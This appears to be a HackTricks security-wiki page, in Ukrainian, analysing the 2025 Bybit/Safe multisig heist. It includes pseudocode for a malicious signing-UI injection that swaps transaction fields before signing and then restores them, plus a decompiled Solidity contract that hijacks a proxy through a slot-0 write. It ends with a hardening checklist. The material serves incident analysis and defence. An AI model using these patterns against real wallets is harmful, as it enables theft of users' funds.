# Компрометація Web3 Signing Workflow і захоплення Safe Delegatecall Proxy

{{#include ../../banners/hacktricks-training.md}}

## Огляд

Ланцюжок викрадення з cold-wallet поєднав **компрометацію supply-chain веб-інтерфейсу Safe{Wallet}** з **on-chain delegatecall primitive, який перезаписав pointer реалізації proxy (slot 0)**. Ключові висновки:

- Якщо dApp може впроваджувати code у signing path, він може змусити signer створити дійсний **EIP-712 signature із вибраними attacker полями**, одночасно відновивши оригінальні UI data, щоб інші signers нічого не помітили.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>
- Safe proxies зберігають `masterCopy` (implementation) у **storage slot 0**. Delegatecall до contract, який записує дані у slot 0, фактично “оновлює” Safe до attacker logic, надаючи повний контроль над wallet.<sup>[[3]](#references)</sup>

## Off-chain: Цільова мутація підпису в Safe{Wallet}

Підроблений Safe bundle (`_app-*.js`) вибірково атакував конкретні адреси Safe + signer. Впроваджена logic виконувалася безпосередньо перед signing call:<sup>[[1]](#references)[[3]](#references)</sup>
```javascript
// Pseudocode of the malicious flow
orig = structuredClone(tx.data);
if (isVictimSafe && isVictimSigner && tx.data.operation === 0) {
tx.data.to = attackerContract;
tx.data.data = "0xa9059cbb...";      // ERC-20 transfer selector
tx.data.operation = 1;                 // delegatecall
tx.data.value = 0;
tx.data.safeTxGas = 45746;
const sig = await sdk.signTransaction(tx, safeVersion);
sig.data = orig;                       // restore original before submission
tx.data = orig;
return sig;
}
```
### Властивості атаки
- **Context-gated**: жорстко задані allowlists для victim Safes/signers запобігали зайвому шуму та знижували ймовірність виявлення.<sup>[[1]](#references)[[3]](#references)</sup>
- **Last-moment mutation**: поля (`to`, `data`, `operation`, gas) перезаписувалися безпосередньо перед `signTransaction`, а потім відновлювалися, тому payload пропозиції в UI виглядав безпечним, тоді як підписи відповідали payload атакера.<sup>[[3]](#references)</sup>
- **EIP-712 opacity**: wallets показували структуровані дані, але не декодували вкладений calldata і не виділяли `operation = delegatecall`, через що змінене повідомлення фактично підписувалося всліпу.<sup>[[3]](#references)[[4]](#references)</sup>

### Актуальність валідації Gateway
Пропозиції Safe надсилаються до **Safe Client Gateway**.<sup>[[5]](#references)</sup> До впровадження посилених перевірок Gateway міг прийняти пропозицію, у якій `safeTxHash`/signature відповідали іншим полям, ніж у JSON body, якщо UI переписував їх після підписання. Після інциденту Gateway відхиляє пропозиції, якщо їхній hash/signature не відповідають надісланій транзакції.<sup>[[3]](#references)</sup> Аналогічну server-side перевірку hash слід застосовувати до будь-якого signing-orchestration API.

### Основні моменти інциденту Bybit/Safe 2025 року
- Виведення коштів із cold wallet Bybit 21 лютого 2025 року (~401k ETH) використало той самий патерн: скомпрометований Safe S3 bundle спрацьовував лише для Bybit signers і змінював `operation=0` → `1`, спрямовуючи `to` на попередньо розгорнутий контракт атакера, який записував значення в slot 0.<sup>[[1]](#references)[[3]](#references)</sup>
- Wayback-кешований `_app-52c9031bfa03da47.js` показує, що логіка була прив’язана до Safe Bybit (`0x1db9…cf4`) та адрес підписантів, після чого bundle було негайно відновлено до чистого через дві хвилини після виконання, що відтворює трюк “mutate → sign → restore”.<sup>[[1]](#references)[[2]](#references)</sup>
- Шкідливий контракт (наприклад, `0x9622…c7242`) містив прості функції `sweepETH/sweepERC20` і `transfer(address,uint256)`, яка записувала implementation slot. Виконання `execTransaction(..., operation=1, to=contract, data=transfer(newImpl,0))` змінювало implementation proxy та надавало повний контроль.<sup>[[1]](#references)[[3]](#references)</sup>

## On-chain: захоплення proxy через delegatecall і колізію слотів

Safe proxies зберігають `masterCopy` у **storage slot 0** і делегують усю логіку йому. Оскільки Safe підтримує **`operation = 1` (delegatecall)**, будь-яка підписана транзакція може вказати довільний контракт і виконати його код у контексті storage proxy.<sup>[[3]](#references)</sup>

Контракт атакера імітував `transfer(address,uint256)` ERC-20, але натомість записував `_to` у slot 0:<sup>[[1]](#references)[[3]](#references)</sup>
```solidity
// Decompiler view (storage slot 0 write)
uint256 stor0; // slot 0
function transfer(address _to, uint256 _value) external {
stor0 = uint256(uint160(_to));
}
```
Шлях виконання:<sup>[[1]](#references)[[3]](#references)</sup>
1. Жертви підписують `execTransaction` з `operation = delegatecall`, `to = attackerContract`, `data = transfer(newImpl, 0)`.
2. Safe masterCopy перевіряє підписи для цих параметрів.
3. Proxy виконує delegatecall до `attackerContract`; тіло `transfer` записує значення у slot 0.
4. Slot 0 (`masterCopy`) тепер вказує на логіку під контролем attacker → **повне захоплення wallet і виведення коштів**.

### Нотатки щодо Guard і версій (посилення захисту після інциденту)
- Transaction guards були представлені в Safe v1.3.0 і можуть перевіряти всі параметри `execTransaction` перед виконанням; Guard може відхилити `delegatecall` або застосувати політику до destination і calldata. Bybit використовував v1.1.1, де цей hook ще не був доступний.<sup>[[2]](#references)[[6]](#references)</sup>

## Detection & hardening checklist

- **Цілісність UI**: фіксуйте JS assets / SRI; відстежуйте відмінності bundle; розглядайте signing UI як частину межі довіри.
- **Валідація під час підписання**: hardware wallets з **EIP-712 clear-signing**; явно відображайте `operation` і декодуйте вкладений calldata. Відхиляйте підписання, коли `operation = 1`, якщо це не дозволено політикою.<sup>[[3]](#references)</sup>
- **Перевірки hash на стороні сервера**: gateways/services, які ретранслюють proposals, мають повторно обчислювати `safeTxHash` і перевіряти, що підписи відповідають надісланим полям.<sup>[[3]](#references)</sup>
- **Політики/allowlists**: правила preflight для `to`, selectors, типів assets і заборона delegatecall, окрім перевірених flows. Перед broadcasting повністю підписаних transactions вимагайте перевірку внутрішнім policy service.
- **Дизайн контракту**: уникайте відкриття довільного delegatecall у multisig/treasury wallets, якщо це не є суворо необхідним. Розглядайте будь-який implementation pointer як upgrade primitive: захищайте його явним access control і контролюйте targets/selectors delegatecall; саме перенесення pointer до іншого slot не є повним захистом.<sup>[[3]](#references)[[6]](#references)</sup>
- **Моніторинг**: сповіщайте про виконання delegatecall з wallets, що зберігають treasury funds, а також про proposals, які змінюють `operation` зі звичних шаблонів `call`.

## References

- [1] [Криміналістичний аналіз експлойту Bybit Safe від AnChain.AI](https://www.anchain.ai/blog/bybit)
- [2] [Аналіз компрометації Safe bundle від Zero Hour Technology](https://www.panewslab.com/en/articles/7r34t0qk9a15)
- [3] [Поглиблений технічний аналіз hack Bybit (NCC Group)](https://www.nccgroup.com/research-blog/in-depth-technical-analysis-of-the-bybit-hack/)
- [4] [EIP-712](https://eips.ethereum.org/EIPS/eip-712)
- [5] [safe-client-gateway (GitHub)](https://github.com/safe-global/safe-client-gateway)
- [6] [Журнал змін Safe smart account v1.3.0 (GitHub)](https://github.com/safe-fndn/safe-smart-account/blob/main/CHANGELOG.md)
{{#include ../../banners/hacktricks-training.md}}
